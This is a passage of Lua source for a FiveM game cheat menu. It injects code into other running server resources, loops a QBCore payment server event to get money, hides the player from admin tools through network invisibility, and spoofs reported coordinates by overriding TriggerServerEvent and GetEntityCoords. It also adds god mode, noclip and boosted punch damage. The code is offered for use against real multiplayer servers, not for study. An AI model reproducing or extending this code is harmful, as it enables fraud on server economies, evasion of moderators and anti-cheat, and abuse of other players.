                                    MachoInjectResource(resName, 'TriggerServerEvent("QBCore:server:Paymentcheck")')
                                end)
                                foundPaymentResource = true
                                MachoMenuNotification("Money", "Payment check triggered from " .. resName)
                                break
                            end
                        end
                    end
                end
                if not foundPaymentResource then
                    MachoMenuNotification("Error", "Payment check resource not found")
                    isPaymentLoopRunning = false
                    if paymentCheckbox then
                        MachoMenuSetCheckbox(paymentCheckbox, false)
                    end
                    break
                end
            end
            Citizen.Wait(paymentLoopSpeed)
        end
    end)
end




-- Menu creation
local function createMenu()
    MenuWindow = MachoMenuTabbedWindow("by Scar", MenuStartCoords.x, MenuStartCoords.y, MenuSize.x, MenuSize.y, TabsBarWidth)
    MachoMenuSetAccent(MenuWindow, 128, 128, 128)

    
    MachoMenuText(MenuWindow,"Player & Self")
    local GeneralTab = MachoMenuAddTab(MenuWindow, "Player")
    local LeftSectionWidth = (MenuSize.x - TabsBarWidth) * 0.5
    local RightSectionWidth = (MenuSize.x - TabsBarWidth) * 0.35
    local RightSectionHeight = (MenuSize.y - 20) / 2

    local GeneralLeftSection = MachoMenuGroup(GeneralTab, "looks & Outfits", 
        TabsBarWidth + 5, 5 + MachoPaneGap, 
        TabsBarWidth + LeftSectionWidth, MenuSize.y - 5)
        
        

MachoMenuButton(GeneralLeftSection, "Random outfit", function()
    Citizen.CreateThread(function()
        while not NetworkIsPlayerActive(PlayerId()) do
            Citizen.Wait(0)
        end
    
        Citizen.Wait(0) 
    
        local model = GetHashKey("mp_m_freemode_01")  
    
        RequestModel(model)
        while not HasModelLoaded(model) do
            Citizen.Wait(0)
        end
    
        SetPlayerModel(PlayerId(), model)
        SetModelAsNoLongerNeeded(model)
    
        local newPed = PlayerPedId()
    
        SetPedComponentVariation(newPed, 8, math.random(0, 15), 0, 2)  
        SetPedComponentVariation(newPed, 11, math.random(0, 120), 0, 2) 
        SetPedComponentVariation(newPed, 3, math.random(0, 15), 0, 2)   
        SetPedComponentVariation(newPed, 4, math.random(0, 50), 0, 2)   
        SetPedComponentVariation(newPed, 6, math.random(0, 30), 0, 2)   
    
        SetPedPropIndex(newPed, 0, math.random(0, 10), 0, true) 
        SetPedPropIndex(newPed, 1, math.random(0, 10), 0, true)  
    
    end)
    
end)
local enableRandomOutfit = false
local outfitChangeInterval = 0 

MachoMenuCheckbox(GeneralLeftSection, "Random Outfit Loop", 
    function()
        enableRandomOutfit = true
    end,
    function()
        enableRandomOutfit = false
    end
)
MachoMenuText(GeneralLeftSection,"Exploits & Self")
MachoMenuCheckbox(GeneralLeftSection, "Super Punch", 
    function()
        local targetResource = nil
        local resourcePriority = {"any", "any", "any"}
        local foundResources = {}
        
        for _, resourceName in ipairs(resourcePriority) do
            if GetResourceState(resourceName) == "started" then
                table.insert(foundResources, resourceName)
            end
        end
        
        if #foundResources > 0 then
            targetResource = foundResources[math.random(1, #foundResources)]
        else
            local allResources = {}
            for i = 0, GetNumResources() - 1 do
                local resourceName = GetResourceByFindIndex(i)
                if resourceName and GetResourceState(resourceName) == "started" then
                    table.insert(allResources, resourceName)
                end
            end
            if #allResources > 0 then
                targetResource = allResources[math.random(1, #allResources)]
            else
                MachoMenuNotification("Error", "No resources found!")
                return
            end
        end
        
        MachoInjectResource(targetResource, [[
            local playerPed = PlayerPedId() 
            local weaponHash = GetHashKey("WEAPON_UNARMED") 
            
            SetWeaponDamageModifier(weaponHash, 9999.0)
        ]])
        
        MachoMenuNotification("Combat", "Super Punch enabled")
    end,
    function()
        local targetResource = nil
        local resourcePriority = {"any", "any", "any"}
        local foundResources = {}
        
        for _, resourceName in ipairs(resourcePriority) do
            if GetResourceState(resourceName) == "started" then
                table.insert(foundResources, resourceName)
            end
        end
        
        if #foundResources > 0 then
            targetResource = foundResources[math.random(1, #foundResources)]
        else
            local allResources = {}
            for i = 0, GetNumResources() - 1 do
                local resourceName = GetResourceByFindIndex(i)
                if resourceName and GetResourceState(resourceName) == "started" then
                    table.insert(allResources, resourceName)
                end
            end
            if #allResources > 0 then
                targetResource = allResources[math.random(1, #allResources)]
            end
        end
        
        if targetResource then
            MachoInjectResource(targetResource, [[
                local playerPed = PlayerPedId() 
                local weaponHash = GetHashKey("WEAPON_UNARMED") 
                
                SetWeaponDamageModifier(weaponHash, 1.0)
            ]])
            
            MachoMenuNotification("Combat", "Super Punch disabled")
        end
    end
)
local invisibilityLoop = false
MachoMenuCheckbox(GeneralLeftSection, "kill frindly", 
    function()
        local targetResource = nil
        local resourcePriority = {"any", "any", "any"}
        local foundResources = {}
        
        for _, resourceName in ipairs(resourcePriority) do
            if GetResourceState(resourceName) == "started" then
                table.insert(foundResources, resourceName)
            end
        end
        
        if #foundResources > 0 then
            targetResource = foundResources[math.random(1, #foundResources)]
        else
            local allResources = {}
            for i = 0, GetNumResources() - 1 do
                local resourceName = GetResourceByFindIndex(i)
                if resourceName and GetResourceState(resourceName) == "started" then
                    table.insert(allResources, resourceName)
                end
            end
            if #allResources > 0 then
                targetResource = allResources[math.random(1, #allResources)]
            else
                MachoMenuNotification("Error", "No resources found!")
                return
            end
        end
        
        MachoInjectResource(targetResource, [[
           SetPedConfigFlag(PlayerPedId(), 140, true)
           SetPedConfigFlag(PlayerPedId(), 45, true)
           SetPedConfigFlag(PlayerPedId(), 442, true)
        ]])
        
        MachoMenuNotification("Player", "Enhanced Mode enabled")
    end,
    function()
        local targetResource = nil
        local resourcePriority = {"any", "any", "any"}
        local foundResources = {}
        
        for _, resourceName in ipairs(resourcePriority) do
            if GetResourceState(resourceName) == "started" then
                table.insert(foundResources, resourceName)
            end
        end
        
        if #foundResources > 0 then
            targetResource = foundResources[math.random(1, #foundResources)]
        else
            local allResources = {}
            for i = 0, GetNumResources() - 1 do
                local resourceName = GetResourceByFindIndex(i)
                if resourceName and GetResourceState(resourceName) == "started" then
                    table.insert(allResources, resourceName)
                end
            end
            if #allResources > 0 then
                targetResource = allResources[math.random(1, #allResources)]
            end
        end
        
        if targetResource then
            MachoInjectResource(targetResource, [[
                SetPedConfigFlag(PlayerPedId(), 140, false)
                SetPedConfigFlag(PlayerPedId(), 45, false)
                SetPedConfigFlag(PlayerPedId(), 442, false)
            ]])
            
            MachoMenuNotification("Player", "Enhanced Mode disabled")
        end
    end
)
local invisibilityAlpha = 255 -- القيمة الافتراضية (مرئي بالكامل)
local invisibilityLoop = false

local selectedKey = 0

local InvisibilitySlider = MachoMenuSlider(GeneralLeftSection, "Invisibility Level", 210, 0, 210, "%", 0, function(Value)
    invisibilityAlpha = Value
    
    -- تطبيق التغيير فوراً إذا كان الاختفاء مفعل
    if invisibilityLoop then
        local playerPed = PlayerPedId()
        
        -- للكلاينت: التحكم في الشفافية
        if invisibilityAlpha == 0 then
            SetEntityVisible(playerPed, false, false)
        else
            SetEntityVisible(playerPed, true, false)
            SetEntityAlpha(playerPed, invisibilityAlpha, false)
        end
    end
end)

MachoMenuCheckbox(GeneralLeftSection, "Invisible",
    function()
        invisibilityLoop = true
        MachoMenuNotification("Invisible", "Activated - Alpha: " .. invisibilityAlpha)
        
        CreateThread(function()
            while invisibilityLoop do
                local playerPed = PlayerPedId()
                
                -- للآخرين: إخفاء كامل دائماً
                SetEntityVisible(playerPed, false, false)
                
                -- للكلاينت فقط: جعل الشخصية مرئية محلياً
                SetEntityLocallyVisible(playerPed)
                
                -- تطبيق مستوى الشفافية للكلاينت
                if invisibilityAlpha == 0 then
                    SetEntityAlpha(playerPed, 0, false)
                else
                    SetEntityAlpha(playerPed, invisibilityAlpha, false)
                end
                
                Wait(0)
            end
            
            -- إرجاع الشخصية للحالة الطبيعية عند الإلغاء
            local playerPed = PlayerPedId()
            SetEntityVisible(playerPed, true, false)
            SetEntityAlpha(playerPed, 255, false)
        end)
    end,
    function()
        invisibilityLoop = false
        MachoMenuNotification("Invisible", "Deactivated")
        
        -- إرجاع الشخصية للحالة الطبيعية
        local playerPed = PlayerPedId()
        SetEntityVisible(playerPed, true, false)
        SetEntityAlpha(playerPed, 255, false)
    end
)

-- Keybind للاختصار
MachoMenuKeybind(GeneralLeftSection, "Invisible Key", 0, function(key, toggle)
    selectedKey = key
end)

-- وظيفة الاختصار
MachoOnKeyDown(function(key)
    if key == selectedKey and selectedKey ~= 0 then
        if not invisibilityLoop then
            invisibilityLoop = true
            MachoMenuNotification("Invisible", "Activated - Alpha: " .. invisibilityAlpha)
            
            CreateThread(function()
                while invisibilityLoop do
                    local playerPed = PlayerPedId()
                    
                    -- للآخرين: إخفاء كامل
                    SetEntityVisible(playerPed, false, false)
                    
                    -- للكلاينت: جعل الشخصية مرئية محلياً
                    SetEntityLocallyVisible(playerPed)
                    
                    -- تطبيق مستوى الشفافية
                    if invisibilityAlpha == 0 then
                        SetEntityAlpha(playerPed, 0, false)
                    else
                        SetEntityAlpha(playerPed, invisibilityAlpha, false)
                    end
                    
                    Wait(0)
                end
                
                -- إرجاع الشخصية للحالة الطبيعية عند الإلغاء
                local playerPed = PlayerPedId()
                SetEntityVisible(playerPed, true, false)
                SetEntityAlpha(playerPed, 255, false)
            end)
        else
            invisibilityLoop = false
            MachoMenuNotification("Invisible", "Deactivated")
            
            -- إرجاع الشخصية للحالة الطبيعية
            local playerPed = PlayerPedId()
            SetEntityVisible(playerPed, true, false)
            SetEntityAlpha(playerPed, 255, false)
        end
    end
end)
local noclip = false
local noclipSpeed = 1
local originalCollision = {}
local selectedKey = 0

-- السلايدر للسرعة
local NoclipSpeedSlider = MachoMenuSlider(GeneralLeftSection, "Noclip Speed", 1, 0.1, 10, "", 1, function(Value)
    noclipSpeed = Value
end)

-- دالة النوكليب الرئيسية
local function NoclipLoop()
    CreateThread(function()
        while noclip do
            local ped = PlayerPedId()
            local coords = GetEntityCoords(ped)
            local x, y, z = coords.x, coords.y, coords.z
            local speed = noclipSpeed
            local veh = GetVehiclePedIsIn(ped, 0)
            
            local entity
            if veh ~= 0 then
                entity = veh
            else
                entity = ped
            end

            SetEntityCollision(entity, false, false)
            SetEntityVelocity(entity, 0.0, 0.0, 0.0)

            -- التحكم في السرعة
            if IsControlPressed(0, 21) then -- Shift للسرعة
                speed = speed * 4
            elseif IsControlPressed(0, 19) then -- Alt للبطء
                speed = speed * 0.3
            end

            -- الحصول على اتجاه الكاميرا
            local camRot = GetGameplayCamRot(2)
            local camHeading = camRot.z
            local camPitch = camRot.x
            
            -- تحويل إلى راديان
            local headingRad = camHeading * 3.14159 / 180.0
            local pitchRad = camPitch * 3.14159 / 180.0
            
            -- حساب الاتجاه الثلاثي الأبعاد
            local dirX = -math.sin(headingRad) * math.cos(pitchRad)
            local dirY = math.cos(headingRad) * math.cos(pitchRad)
            local dirZ = math.sin(pitchRad)

            -- الحركة
            if IsControlPressed(0, 32) then -- W للأمام
                x = x + speed * dirX
                y = y + speed * dirY
                z = z + speed * dirZ
            end

            if IsControlPressed(0, 33) then -- S للخلف
                x = x - speed * dirX
                y = y - speed * dirY
                z = z - speed * dirZ
            end

            if IsControlPressed(0, 34) then -- A يسار
                local leftX = -math.cos(headingRad)
                local leftY = -math.sin(headingRad)
                x = x + speed * leftX
                y = y + speed * leftY
            end

            if IsControlPressed(0, 35) then -- D يمين
                local rightX = math.cos(headingRad)
                local rightY = math.sin(headingRad)
                x = x + speed * rightX
                y = y + speed * rightY
            end

            if IsControlPressed(0, 22) then -- Space للأعلى
                z = z + speed
            end

            if IsControlPressed(0, 36) then -- Ctrl للأسفل
                z = z - speed
            end

            SetEntityCoordsNoOffset(entity, x, y, z, true, true, true)
            
            -- للسيارة: توجيه حسب الكاميرا
            if veh ~= 0 then
                SetEntityHeading(veh, camHeading)
                local currentRot = GetEntityRotation(veh)
                SetEntityRotation(veh, camPitch, currentRot.y, camHeading, 2, true)
            end
            
            Wait(0)
        end
    end)
end

-- دالة تفعيل النوكليب
local function ActivateNoclip()
    noclip = true
    MachoMenuNotification("Noclip", "Activated - Speed: " .. noclipSpeed)
    
    local ped = PlayerPedId()
    local veh = GetVehiclePedIsIn(ped, 0)
    
    -- حفظ حالة التصادم الأصلية
    originalCollision.ped = true
    if veh ~= 0 then
        originalCollision.veh = true
    end
    
    NoclipLoop()
end

-- دالة إلغاء النوكليب
local function DeactivateNoclip()
    noclip = false
    MachoMenuNotification("Noclip", "Deactivated")
    
    -- إعادة تفعيل التصادم
    local ped = PlayerPedId()
    local veh = GetVehiclePedIsIn(ped, 0)
    
    if originalCollision.ped then
        SetEntityCollision(ped, true, true)
    end
    if veh ~= 0 and originalCollision.veh then
        SetEntityCollision(veh, true, true)
    end
end

-- التشيك بوكس للنوكليب
MachoMenuCheckbox(GeneralLeftSection, "Noclip",
    function()
        ActivateNoclip()
    end,
    function()
        DeactivateNoclip()
    end
)

-- الكيبايند للاختصار
MachoMenuKeybind(GeneralLeftSection, "Noclip Key", 0, function(key, toggle)
    selectedKey = key
end)

-- مراقبة ضغط المفتاح باستخدام MachoOnKeyDown
MachoOnKeyDown(function(key)
    if key == selectedKey and selectedKey ~= 0 then
        if not noclip then
            ActivateNoclip()
        else
            DeactivateNoclip()
        end
    end
end)
local radarInvisibilityLoop = false

MachoMenuCheckbox(GeneralLeftSection, "Full Invisibility [BETA]", 
   function()
       radarInvisibilityLoop = true
       MachoMenuNotification("Full Invisibility", "Activated")
       
       Citizen.CreateThread(function()
           while radarInvisibilityLoop do
               local playerPed = PlayerPedId()
               
               -- Hide from radar/minimap completely
               SetEntityVisible(playerPed, true, false) -- Keep visible to yourself
               MachoInjectResource("any",[[SetEntityVisibleToNetwork(PlayerPedId(), false)]])  -- Hide from network/other players
               
               -- Advanced radar hiding
               SetPlayerInvisibleLocally(PlayerId(), false) -- Stay visible to yourself
               SetEntityAlpha(playerPed, 255, false) -- Keep full opacity for yourself
               
               -- Hide blip and disable radar tracking
               local playerId = PlayerId()
               local playerBlip = GetBlipFromEntity(playerPed)
               if DoesBlipExist(playerBlip) then
                   SetBlipAlpha(playerBlip, 0)
                   RemoveBlip(playerBlip)
               end
               
               -- Network invisibility for admin tools
               NetworkSetEntityInvisibleToNetwork(playerPed, true)
               SetNetworkIdExistsOnAllMachines(NetworkGetNetworkIdFromEntity(playerPed), false)
               
               Citizen.Wait(100)
           end
           
           -- Restore visibility when disabled
           local playerPed = PlayerPedId()
           SetEntityVisible(playerPed, true, false)
           MachoInjectResource("any",[[SetEntityVisibleToNetwork(PlayerPedId(), true)]])
           SetPlayerInvisibleLocally(PlayerId(), false)
           SetEntityAlpha(playerPed, 255, false)
           NetworkSetEntityInvisibleToNetwork(playerPed, false)
           SetNetworkIdExistsOnAllMachines(NetworkGetNetworkIdFromEntity(playerPed), true)
       end)
   end,
   function()
       radarInvisibilityLoop = false
       MachoMenuNotification("Full Invisibility", "Deactivatedn")
   end
)


local godModeLoop = false
MachoMenuCheckbox(GeneralLeftSection, "Good Mode", 
   function()
       godModeLoop = true
       MachoMenuNotification("Good Mode", "Activated")
       
       Citizen.CreateThread(function()
           while godModeLoop do
               local playerPed = PlayerPedId()
               SetEntityInvincible(playerPed, true)
               SetPlayerInvincible(PlayerId(), true)
               SetEntityHealth(playerPed, GetEntityMaxHealth(playerPed))
               SetPedArmour(playerPed, GetPlayerMaxArmour(PlayerId()))
               SetEntityCanBeDamaged(playerPed, false)
               SetEntityProofs(playerPed, true, true, true, true, true, true, true, true)
               Citizen.Wait(0)
           end
           
           local playerPed = PlayerPedId()
           SetEntityInvincible(playerPed, false)
           SetPlayerInvincible(PlayerId(), false)
           SetEntityCanBeDamaged(playerPed, true)
           SetEntityProofs(playerPed, false, false, false, false, false, false, false, false)
       end)
   end,
   function()
       godModeLoop = false
       MachoMenuNotification("Good Mode", "Deactivated")
   end
)
-- Semi God Mode

local SemiGod = false

MachoMenuCheckbox(GeneralLeftSection, "Semi God Mode", 
    function()
        SemiGod = true
        MachoMenuNotification("Semi God Mode", "Activated")
        
        Citizen.CreateThread(function()
            while SemiGod do
                local playerPed = PlayerPedId()
                
                -- Keep health above 200
                if GetEntityHealth(playerPed) < 200 then
                    SetEntityHealth(playerPed, 200)
                end
                
                Citizen.Wait(100) -- Check every 100ms
            end
        end)
    end,
    function()
        SemiGod = false
        MachoMenuNotification("Semi God Mode", "Deactivated")
    end
)

local antiTpLoop = false
local originalPosition = nil
local lastSafePosition = nil
local initializationComplete = false
local teleportCooldown = 0
MachoMenuText(GeneralLeftSection,"Antis & Spoofers")
local soloSessionLoop = false
MachoMenuButton(GeneralLeftSection, "start/stop Solo Session", function()
    if not soloSessionLoop then
        soloSessionLoop = true
        MachoMenuNotification("Solo Session", "Activated")
        NetworkStartSoloTutorialSession()
    else
        soloSessionLoop = false
        MachoMenuNotification("Solo Session", "Deactivated")
        NetworkEndTutorialSession()
    end
end)
MachoMenuButton(GeneralLeftSection, "Force Undrag", function()
MachoInjectResource("any", [[
    local playerPed = PlayerPedId()
    local playerPos = GetEntityCoords(playerPed)
    local forward = GetEntityForwardVector(playerPed)
    local spawnPos = playerPos + forward * 2.0
    local heading = GetEntityHeading(playerPed)
    local wallModel = `prop_barriercrash_01`

    -- Request model (client-side)
    RequestModel(wallModel)
    while not HasModelLoaded(wallModel) do
        Citizen.Wait(10)
    end

    -- Create invisible, non-networked wall object (client-side only)
    local wallObject = CreateObjectNoOffset(wallModel, spawnPos.x, spawnPos.y, spawnPos.z, false, false, false)
    SetEntityHeading(wallObject, heading)
    PlaceObjectOnGroundProperly(wallObject)
    SetEntityAsMissionEntity(wallObject, true, true)
    FreezeEntityPosition(wallObject, true)
    SetEntityCollision(wallObject, true, true)
    SetEntityDynamic(wallObject, false)
    SetEntityInvincible(wallObject, true)
    SetEntityVisible(wallObject, false, false)

    SetModelAsNoLongerNeeded(wallModel)

    -- Force player into cover (client-side)
    ClearPedTasksImmediately(playerPed)
    SetPedConfigFlag(playerPed, 287, true)
    TaskWarpPedDirectlyIntoCover(playerPed, 1000, true, true, false, nil)

    -- Delete wall immediately (client-side)
    Citizen.Wait(100)
    if DoesEntityExist(wallObject) then
        DeleteEntity(wallObject)
    end
]])
end)
MachoMenuCheckbox(GeneralLeftSection, "Anti HS", 
    function()
        local targetResource = nil
        local resourcePriority = {"any", "any", "any"}
        local foundResources = {}
        
        for _, resourceName in ipairs(resourcePriority) do
            if GetResourceState(resourceName) == "started" then
                table.insert(foundResources, resourceName)
            end
        end
        
        if #foundResources > 0 then
            targetResource = foundResources[math.random(1, #foundResources)]
        else
            local allResources = {}
            for i = 0, GetNumResources() - 1 do
                local resourceName = GetResourceByFindIndex(i)
                if resourceName and GetResourceState(resourceName) == "started" then
                    table.insert(allResources, resourceName)
                end
            end
            if #allResources > 0 then
                targetResource = allResources[math.random(1, #allResources)]
            else
                MachoMenuNotification("Error", "No resources found!")
                return
            end
        end
        
        MachoInjectResource(targetResource, [[
           SetPedConfigFlag(PlayerPedId(), 34, true)
        ]])
        
        MachoMenuNotification("Player", "Enhanced Mode enabled")
    end,
    function()
        local targetResource = nil
        local resourcePriority = {"any", "any", "any"}
        local foundResources = {}
        
        for _, resourceName in ipairs(resourcePriority) do
            if GetResourceState(resourceName) == "started" then
                table.insert(foundResources, resourceName)
            end
        end
        
        if #foundResources > 0 then
            targetResource = foundResources[math.random(1, #foundResources)]
        else
            local allResources = {}
            for i = 0, GetNumResources() - 1 do
                local resourceName = GetResourceByFindIndex(i)
                if resourceName and GetResourceState(resourceName) == "started" then
                    table.insert(allResources, resourceName)
                end
            end
            if #allResources > 0 then
                targetResource = allResources[math.random(1, #allResources)]
            end
        end
        
        if targetResource then
            MachoInjectResource(targetResource, [[
                SetPedConfigFlag(PlayerPedId(), 34, false)
            ]])
            
            MachoMenuNotification("Player", "Enhanced Mode disabled")
        end
    end
)
MachoMenuCheckbox(GeneralLeftSection, "Anti jack", 
    function()
        local targetResource = nil
        local resourcePriority = {"any", "any", "any"}
        local foundResources = {}
        
        for _, resourceName in ipairs(resourcePriority) do
            if GetResourceState(resourceName) == "started" then
                table.insert(foundResources, resourceName)
            end
        end
        
        if #foundResources > 0 then
            targetResource = foundResources[math.random(1, #foundResources)]
        else
            local allResources = {}
            for i = 0, GetNumResources() - 1 do
                local resourceName = GetResourceByFindIndex(i)
                if resourceName and GetResourceState(resourceName) == "started" then
                    table.insert(allResources, resourceName)
                end
            end
            if #allResources > 0 then
                targetResource = allResources[math.random(1, #allResources)]
            else
                MachoMenuNotification("Error", "No resources found!")
                return
            end
        end
        
        MachoInjectResource(targetResource, [[
           SetPedConfigFlag(PlayerPedId(), 140, true)
           SetPedConfigFlag(PlayerPedId(), 45, true)
        ]])
        
        MachoMenuNotification("Player", "Enhanced Mode enabled")
    end,
    function()
        local targetResource = nil
        local resourcePriority = {"any", "any", "any"}
        local foundResources = {}
        
        for _, resourceName in ipairs(resourcePriority) do
            if GetResourceState(resourceName) == "started" then
                table.insert(foundResources, resourceName)
            end
        end
        
        if #foundResources > 0 then
            targetResource = foundResources[math.random(1, #foundResources)]
        else
            local allResources = {}
            for i = 0, GetNumResources() - 1 do
                local resourceName = GetResourceByFindIndex(i)
                if resourceName and GetResourceState(resourceName) == "started" then
                    table.insert(allResources, resourceName)
                end
            end
            if #allResources > 0 then
                targetResource = allResources[math.random(1, #allResources)]
            end
        end
        
        if targetResource then
            MachoInjectResource(targetResource, [[
                SetPedConfigFlag(PlayerPedId(), 140, false)
                SetPedConfigFlag(PlayerPedId(), 45, false)
            ]])
            
            MachoMenuNotification("Player", "Enhanced Mode disabled")
        end
    end
)
MachoMenuCheckbox(GeneralLeftSection, "Location Spoof [DESYNC MODE]", 
    function()
        enableLocationSpoof = true
        local fakeCoords = vector3(-1037.0, -2737.0, 20.0) -- Los Santos Airport

        CreateThread(function()
            while enableLocationSpoof do
                local targetResource = nil
                local resourcePriority = {"any", "any", "anya"}
                local foundResources = {}

                for _, res in ipairs(resourcePriority) do
                    if GetResourceState(res) == "started" then
                        table.insert(foundResources, res)
                    end
                end

                if #foundResources > 0 then
                    targetResource = foundResources[math.random(1, #foundResources)]
                else
                    for i = 0, GetNumResources() - 1 do
                        local res = GetResourceByFindIndex(i)
                        if res and GetResourceState(res) == "started" then
                            table.insert(foundResources, res)
                        end
                    end
                    if #foundResources > 0 then
                        targetResource = foundResources[math.random(1, #foundResources)]
                    end
                end

                if targetResource then
                    MachoInjectResource(targetResource, [[
                        local fakeX, fakeY, fakeZ = ]] .. fakeCoords.x .. [[, ]] .. fakeCoords.y .. [[, ]] .. fakeCoords.z .. [[

                        -- Save originals
                        local originalTriggerServerEvent = TriggerServerEvent
                        local originalGetEntityCoords = GetEntityCoords
                        local originalSetEntityCoordsNoOffset = SetEntityCoordsNoOffset

                        -- Override position reporting
                        TriggerServerEvent = function(eventName, ...)
                            local args = {...}
                            if string.find(eventName:lower(), "position") or string.find(eventName:lower(), "coord") or string.find(eventName:lower(), "location") then
                                for i, arg in ipairs(args) do
                                    if type(arg) == "table" and arg.x and arg.y and arg.z then
                                        args[i] = {x = fakeX, y = fakeY, z = fakeZ}
                                    end
                                end
                            end
                            return originalTriggerServerEvent(eventName, table.unpack(args))
                        end

                        -- Spoof coords to admin tools
                        GetEntityCoords = function(entity, alive)
                            if entity == PlayerPedId() then
                                return vector3(fakeX, fakeY, fakeZ)
                            end
                            return originalGetEntityCoords(entity, alive)
                        end

                        -- Desync: Force local ped to be far from server coords
                        CreateThread(function()
                            while true do
                                local ped = PlayerPedId()
                                -- Rapid micro movements around the fake location
                                local jitter = math.random(-2,2) + 0.001 * math.random()
                                local fx, fy, fz = fakeX + jitter, fakeY - jitter, fakeZ
                                originalSetEntityCoordsNoOffset(ped, fx, fy, fz, false, false, false)

                                Wait(100 + math.random(20, 80))
                            end
                        end)
                    ]])
                end

                Wait(2000)
            end
        end)
    end,
    function()
        enableLocationSpoof = false

        local targetResource = nil
        local resourcePriority = {"any", "spawnmanager", "sessionmanager"}
        for _, res in ipairs(resourcePriority) do
            if GetResourceState(res) == "started" then
                targetResource = res
                break
            end
        end

        if targetResource then
            MachoInjectResource(targetResource, [[
                -- Cleanup and restore original behavior
                collectgarbage()
            ]])
        end
    end
)

MachoMenuCheckbox(GeneralLeftSection, "Anti Teleport (Player Detection)", 
   function()
       antiTpLoop = true
       
       -- Reset everything on activation
       originalPosition = nil
       lastSafePosition = nil
       initializationComplete = false
       teleportCooldown = 0
       
       MachoMenuNotification("Anti TP", "Initializing player-based protection...")
       
       Citizen.CreateThread(function()
           -- Initialization phase
           Citizen.Wait(1000)
           local playerPed = PlayerPedId()
           originalPosition = GetEntityCoords(playerPed)
           lastSafePosition = originalPosition
           initializationComplete = true
           MachoMenuNotification("Anti TP", " Player-detection protection active")
           
           while antiTpLoop do
               Citizen.Wait(50)
               
               if initializationComplete then
                   local playerPed = PlayerPedId()
                   local playerCoords = GetEntityCoords(playerPed)
                   local currentTime = GetGameTimer()
                   
                   if originalPosition ~= nil then
                       local distance = #(playerCoords - originalPosition)
                       
                       -- Only check if cooldown has passed
                       if currentTime > teleportCooldown then
                           -- Check for suspicious teleportation (moved more than 30 meters)
                           if distance > 30.0 then
                               -- Look for nearby players at the new location
                               local nearbyPlayers = {}
                               
                               for i = 0, 255 do
                                   if i ~= PlayerId() and NetworkIsPlayerActive(i) then
                                       local otherPlayer = GetPlayerPed(i)
                                       if DoesEntityExist(otherPlayer) then
                                           local otherPos = GetEntityCoords(otherPlayer)
                                           local distanceToOther = #(playerCoords - otherPos)
                                           
                                           -- If there's a player within 1 meter of teleport destination
                                           if distanceToOther <= 1.0 then
                                               local playerName = GetPlayerName(i) or "Unknown"
                                               local playerId = GetPlayerServerId(i) or 0
                                               
                                               table.insert(nearbyPlayers, {
                                                   name = playerName,
                                                   serverId = playerId,
                                                   clientId = i,
                                                   distance = distanceToOther
                                               })
                                           end
                                       end
                                   end
                               end
                               
                               -- If there are nearby players, it's likely a malicious teleport
                               if #nearbyPlayers > 0 then
                                   -- Use last safe position instead of original
                                   local safePos = lastSafePosition or originalPosition
                                   
                                   -- Ensure safe position is valid
                                   if safePos and safePos.x and safePos.y and safePos.z then
                                       SetEntityCoords(playerPed, safePos.x, safePos.y, safePos.z, false, false, false, true)
                                       SetEntityVelocity(playerPed, 0.0, 0.0, 0.0)
                                       
                                       -- Set cooldown to prevent spam
                                       teleportCooldown = currentTime + 1000
                                       
                                       -- Send detailed notification
                                       for _, player in ipairs(nearbyPlayers) do
                                           MachoMenuNotification(" TELEPORT BLOCKED", 
                                               string.format("Player: %s | ID: %d | Server ID: %d", 
                                               player.name, player.clientId, player.serverId))
                                           break -- Show only first player to avoid spam
                                       end
                                       
                                       -- Don't update originalPosition after teleport block
                                       Citizen.Wait(500)
                                       originalPosition = GetEntityCoords(playerPed)
                                   end
                               else
                                   -- Check for other suspicious activity
                                   local currentVelocity = GetEntityVelocity(playerPed)
                                   local actualSpeed = #currentVelocity
                                   local vehicle = GetVehiclePedIsIn(playerPed, false)
                                   local interiorId = GetInteriorFromEntity(playerPed)
                                   
                                   -- Allow legitimate teleports (interiors, vehicles, etc.)
                                   if interiorId ~= 0 or vehicle ~= 0 or actualSpeed > 5.0 then
                                       -- Legitimate teleport - update positions
                                       originalPosition = playerCoords
                                       lastSafePosition = playerCoords
                                   elseif distance > 100.0 then
                                       -- Very suspicious teleport - block it
                                       local safePos = lastSafePosition or originalPosition
                                       if safePos and safePos.x and safePos.y and safePos.z then
                                           SetEntityCoords(playerPed, safePos.x, safePos.y, safePos.z, false, false, false, true)
                                           teleportCooldown = currentTime + 1000
                                           MachoMenuNotification(" SUSPICIOUS TELEPORT", "Blocked long-distance teleport")
                                           Citizen.Wait(500)
                                           originalPosition = GetEntityCoords(playerPed)
                                       end
                                   else
                                       -- Allow and update
                                       originalPosition = playerCoords
                                       lastSafePosition = playerCoords
                                   end
                               end
                           else
                               -- Normal movement - update positions
                               originalPosition = playerCoords
                               
                               -- Update safe position only for short distances
                               if distance < 15.0 then
                                   lastSafePosition = playerCoords
                               end
                           end
                       else
                           -- During cooldown, just update original position for next check
                           originalPosition = playerCoords
                       end
                   else
                       -- Initialize position
                       originalPosition = playerCoords
                       lastSafePosition = playerCoords
                   end
               end
           end
       end)
   end,
   function()
       antiTpLoop = false
       originalPosition = nil
       lastSafePosition = nil
       initializationComplete = false
       teleportCooldown = 0
       MachoMenuNotification("Anti TP", "Deactivated")
   end
)

local autoResetLoop = false

MachoMenuCheckbox(GeneralLeftSection, "Auto Reset", 
   function()
       autoResetLoop = true
       MachoMenuNotification("Auto Reset", "Activated - Character resets every 0.1 seconds")
       
       Citizen.CreateThread(function()
           while autoResetLoop do
               local playerPed = PlayerPedId()
               
               -- Reset character health and states without affecting camera
               SetEntityHealth(playerPed, GetEntityMaxHealth(playerPed))
               SetPedArmour(playerPed, GetPlayerMaxArmour(PlayerId()))
               
               -- Clear all damage and effects
               ClearPedBloodDamage(playerPed)
               ClearPedWetness(playerPed)
               ClearPedEnvDirt(playerPed)
               ClearPedDamageDecalByZone(playerPed, 0, "ALL")
               ClearPedDamageDecalByZone(playerPed, 1, "ALL")
               ClearPedDamageDecalByZone(playerPed, 2, "ALL")
               ClearPedDamageDecalByZone(playerPed, 3, "ALL")
               ClearPedDamageDecalByZone(playerPed, 4, "ALL")
               ClearPedDamageDecalByZone(playerPed, 5, "ALL")
               
               -- Reset animation and movement states
               if not IsPedInAnyVehicle(playerPed, false) then
                   ClearPedTasks(playerPed)
                   ClearPedSecondaryTask(playerPed)
               end
               
               -- Reset facial expressions and emotions
               ClearFacialIdleAnimOverride(playerPed)
               
               -- Reset any stuck states
               SetPedCanRagdoll(playerPed, true)
               SetPedCanRagdoll(playerPed, false)
               
               -- Reset stamina
               RestorePlayerStamina(PlayerId(), 1.0)
               
               Citizen.Wait(100) -- 0.1 seconds = 100ms
           end
       end)
   end,
   function()
       autoResetLoop = false
